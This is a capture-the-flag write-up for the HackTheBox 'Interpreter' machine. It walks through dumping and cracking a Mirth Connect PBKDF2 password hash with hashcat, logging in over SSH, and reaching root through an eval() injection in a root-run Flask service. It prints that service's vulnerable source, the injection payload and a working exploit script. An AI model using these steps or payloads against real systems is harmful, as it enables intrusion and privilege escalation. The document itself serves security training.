# HTB Interpreter — Writeup

**Machine:** Interpreter  
**OS:** Linux  
**Difficulty:** Medium  
**Attack path:** Mirth Connect database → PBKDF2 password cracking → SSH as `sedric` → Flask `eval()` injection → root

---

## Table of Contents

1. [Overview](#overview)
2. [Enumeration](#enumeration)
3. [Initial Access — Mirth Database](#initial-access--mirth-database)
4. [Cracking the `sedric` Password](#cracking-the-sedric-password)
5. [SSH as `sedric`](#ssh-as-sedric)
6. [Privilege Escalation](#privilege-escalation)
7. [Lessons Learned](#lessons-learned)

---

## Overview

Interpreter is a medium Linux machine running Mirth Connect 4.4.0 backed by MariaDB.

The attack chain:

1. Mirth Connect exposes an HL7 MLLP listener on port `6661`.
2. A channel forwards XML-converted patient data to a local Flask notification service on `<IP>:54321`.
3. The notification service uses `eval()` on user-controlled fields, leading to remote code execution as `root`.
4. To reach the service, first obtain a local foothold by cracking the PBKDF2-HMAC-SHA256 hash for the `sedric` user stored in Mirth's database.

---

## 1. Enumeration

### Port Scan

```text
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
6661/tcp open  unknown   # HL7 MLLP
8443/tcp open  https
```

The web interfaces on ports `80`, `443`, and `8443` are Mirth Connect Administrator.

### Mirth Connect Version

```text
Mirth Connect 4.4.0
```

This version is vulnerable to CVE-2023-43208 (XStream deserialization RCE), but exploiting it is not required for this machine.

---

## 2. Initial Access — Mirth Database

The Mirth configuration file `/usr/local/mirthconnect/conf/mirth.properties` contains database credentials:

```properties
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.username = mirthdb
database.password = MirthPass123!
```

The database is reachable only from localhost. It can be queried after obtaining a local shell (see below). For this writeup, assume a low-privileged shell as `mirth` has already been obtained — for example, through CVE-2023-43208 or by abusing the Mirth REST API.

### Dumping Users

```sql
USE mc_bdd_prod;
SELECT * FROM PERSON;
SELECT * FROM PERSON_PASSWORD;
```

The `PERSON` table contains:

```text
+----+----------+------+
| ID | USERNAME | ROLE |
+----+----------+------+
|  2 | sedric   | NULL |
+----+----------+------+
```

The `PERSON_PASSWORD` table contains:

```text
+-----------+----------------------------------------------------------+
| PERSON_ID | PASSWORD                                                 |
+-----------+----------------------------------------------------------+
|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== |
+-----------+----------------------------------------------------------+
```

Only one user is present: `sedric`.

---

## 3. Cracking the `sedric` Password

### Determining the Hashing Scheme

Mirth Connect is open source. Inspecting the source code (`Digester.java` / `UserController`) shows that passwords are stored using:

- **Algorithm:** `PBKDF2WithHmacSHA256`
- **Salt:** 8 bytes
- **Iterations:** 600000
- **Encoding:** Base64 of `salt || digest`

The stored value decodes to 40 bytes: an 8-byte salt followed by a 32-byte digest.

### Splitting the Value

```bash
echo 'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==' | base64 -d > raw.bin

# Salt: first 8 bytes
head -c8 raw.bin | base64 -w0
# u/+LBBOUnac=

# Digest: remaining 32 bytes
tail -c +9 raw.bin | base64 -w0
# YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

### Building the Hashcat Hash

Hashcat mode `10900` (`PBKDF2-HMAC-SHA256`) expects the following format:

```text
sha256:<iterations>:<salt_b64>:<digest_b64>
```

Create `hash.txt`:

```bash
cat > hash.txt <<'EOF'
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
EOF
```

### Cracking

```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

Result:

```text
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1
```

The password for `sedric` is `snowflake1`.

---

## 4. SSH as `sedric`

Connect over SSH:

```bash
ssh sedric@interpreter
# Password: snowflake1
```

Read the user flag:

```bash
cat /home/sedric/user.txt
```

---

## 5. Privilege Escalation

### Discovering the Notification Service

As `sedric`, inspect processes running as root:

```bash
ps aux | grep root
```

The output includes:

```text
root  3572  ...  /usr/bin/python3 /usr/local/bin/notif.py
```

Check listening ports:

```bash
ss -tlnp
```

Output:

```text
LISTEN 0 128 <IP>:54321 0.0.0.0:*
```

The service listens on `<IP>:54321`.

The script is readable by members of the `sedric` group:

```bash
ls -la /usr/local/bin/notif.py
# -rwxr----- 1 root sedric 2332 ... /usr/local/bin/notif.py
```

### Reading `notif.py`

```python
#!/usr/bin/env python3
from flask import Flask, request, abort
import re, uuid, os
from datetime import datetime
import xml.etree.ElementTree as ET

app = Flask(__name__)
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "<IP>":
        abort(403)
    try:
        xml_text = request.data.decode()
        xml_root = ET.fromstring(xml_text)
    except ET.ParseError:
        return "XML ERROR\n", 400
    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    id = uuid.uuid4().hex
    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
    path = os.path.join(USER_DIR,f"{id}.txt")
    with open(path,"w") as f:
        f.write(notification+"\n")
    return notification

if __name__=="__main__":
    app.run("<IP>",54321, threaded=True)
```

### Vulnerability Analysis

The `template()` function:

- Validates fields using a regular expression that allows characters such as `(`, `)`, `{`, `}`, quotes, `=`, `+`, `/`, `.`, and `_`.
- Inserts user-controlled values into an f-string.
- Passes the resulting string to `eval()`.

This creates an `eval()` injection vulnerability. Since `notif.py` runs as `root`, code execution through the vulnerable template runs with root privileges.

The following payload is permitted by the regular expression and reads the root flag:

```python
{open('/root/root.txt').read()}
```

It contains no spaces or imports and returns the file contents in the rendered string.

### Exploitation

Send a POST request to the local `/addPatient` endpoint with the payload in the `firstname` field:

```python
import urllib.request

payload = b"""<patient>
  <firstname>{open('/root/root.txt').read()}</firstname>
  <lastname>X</lastname>
  <sender_app>TEST</sender_app>
  <timestamp>20250101</timestamp>
  <birth_date>01/01/2000</birth_date>
  <gender>M</gender>
</patient>"""

req = urllib.request.Request(
    "http://<IP>:54321/addPatient",
    data=payload,
    method="POST",
    headers={"Content-Type": "text/plain"},
)

print(urllib.request.urlopen(req, timeout=5).read().decode(errors="replace"))
```

Example response:

```text
Patient <ROOT FLAG> X (M), 26 years old, received from TEST at 20250101
```

The root flag is returned in the HTTP response. The service also writes a copy of the notification to:

```text
/var/secure-health/patients/<uuid>.txt
```

---

## Attack Chain Summary

```text
Mirth Connect
    → Mirth database credentials
    → PERSON / PERSON_PASSWORD
    → Crack PBKDF2-HMAC-SHA256 hash
    → SSH as sedric
    → Discover root-owned Flask notification service
    → eval() injection through patient XML
    → Read root flag as root
```
